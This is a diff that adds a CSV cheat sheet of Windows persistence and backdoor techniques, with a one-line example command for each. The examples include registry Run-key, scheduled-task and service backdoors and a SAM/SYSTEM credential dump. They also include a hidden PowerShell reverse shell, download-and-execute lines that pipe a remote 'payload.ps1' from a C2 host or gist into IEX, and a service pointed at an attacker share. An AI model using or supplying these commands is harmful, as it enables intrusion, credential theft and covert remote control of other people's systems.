@@ -1,0 +1,28 @@
+Technique,Type,Description,Example
+Startup Folder Drop,Offline,Drop payload in user Startup folder,"copy payload.exe ""%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"""
+Registry Run Key,Offline,Run payload at user logon via registry,"reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Backdoor /t REG_SZ /d ""C:\payload.exe"""
+Scheduled Task,Offline,Create task to run payload at logon,"schtasks /create /tn ""BackdoorTask"" /tr ""C:\payload.exe"" /sc onlogon"
+Service Creation,Offline,Install persistent service,"sc create WinHelper binPath= ""C:\backdoor.exe"" start= auto"
+WMI Event Subscription,Offline,Trigger payload via system event,powershell New-WmiEventFilter + Consumer
+Offline Credential Dump,Offline,Harvest SAM/SYSTEM for later use,reg save HKLM\SAM sam.save && reg save HKLM\SYSTEM system.save
+DLL Hijacking,Offline,Hijack DLL loaded by trusted program,Drop crafted DLL into app folder
+Autorun.inf (on USB),Offline,Auto-execute from USB device,echo [autorun] > autorun.inf && echo open=backdoor.exe >> autorun.inf
+Bootkit / BIOS Implant,Offline,Low-level persistent malware,"Tool-based, outside OS"
+Task Scheduler with Delay,Offline,Run payload after time delay,"schtasks /create /tn ""SilentStart"" /tr ""cmd.exe /c backdoor.exe"" /sc once /st 00:05"
+Reverse Shell,Online,Connect to remote server with shell,"powershell -nop -w hidden -c ""$client = New-Object Net.Sockets.TCPClient('x.x.x.x',4444);..."""
+HTTP(S) Beacon,Online,Call back to remote C2 server,Invoke-WebRequest -Uri http://c2[.]domain/ping
+DNS Tunneling,Online,Exfil data or connect via DNS,"Tools: iodine, dnscat2"
+PowerShell Empire Listener,Online,Interactive PowerShell backdoor,powershell.exe -nop -enc ...
+Cobalt Strike Beacon,Online,C2 framework with staging,Encrypted beacon over HTTP/HTTPS
+Cloud Storage Abuse,Online,Drop payload to OneDrive/Dropbox,"copy payload.exe ""C:\Users\user\OneDrive\"""
+Outlook Rules,Online,Trigger macro or script via mail,Set rule to run script
+Malicious LNK File,Online,Shortcut triggering online payload,cmd /c powershell -c IEX(New-Object Net.WebClient).DownloadString('http://c2/payload.ps1')
+Remote Service Start,Online,Start service over SMB/HTTP,sc.exe \\victim create badsvc binPath= \\attacker\share\payload.exe
+Cloud-based C2,Online,"Host script on GitHub, retrieve via curl",curl https://gist.github.com/user/payload.ps1 | iex
+Shim Databases,Mixed,DLL injection via Application Compatibility Toolkit,Use sdbinst.exe to install
+COM Hijacking,Mixed,Hijack COM registry class to load DLL,reg add HKCU\Software\Classes\CLSID...
+Logon Script Injection,Mixed,Append payload to logon script,echo backdoor >> script.bat
+LSA Load Plugins,Mixed,Register malicious DLL for LSA,"reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v ""Authentication Packages"""
+DLL Side-Loading,Mixed,Load malicious DLL via legit app,Drop malicious DLL beside signed EXE
+UAC Bypass via LOLBins,Mixed,Bypass UAC using trusted binaries,"fodhelper.exe, sdclt.exe, eventvwr.exe"
+AppLocker/WDAC Evasion,Mixed,Run unauthorized binaries by exploiting policy gaps,Signed LOLBins or macro payloads
